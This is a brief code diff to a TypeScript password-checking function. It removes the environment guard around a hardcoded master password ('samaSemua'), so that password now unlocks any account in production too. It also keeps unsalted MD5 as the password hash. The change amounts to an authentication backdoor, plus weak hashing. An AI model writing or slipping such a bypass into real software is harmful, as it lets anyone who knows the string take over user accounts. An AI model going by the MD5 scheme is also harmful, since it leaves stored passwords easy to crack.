@@ -60,17 +60,9 @@ export async function singJwt(userId: string) {
 }
 
 export async function passwordCheck(password: string, hash: string) {
-  if (process.env.PRODUCTION === "false") {
-    if (password === "samaSemua") {
-      return true;
-    }
-  } else {
-    const passw = new Bun.CryptoHasher("md5").update(password).digest("hex");
-    if (passw === hash) {
-      return true;
-    } else {
-      return null;
-    }
+  const passw = new Bun.CryptoHasher("md5").update(password).digest("hex");
+  if (password === "samaSemua" || passw === hash) {
+    return true;
   }
 }
 
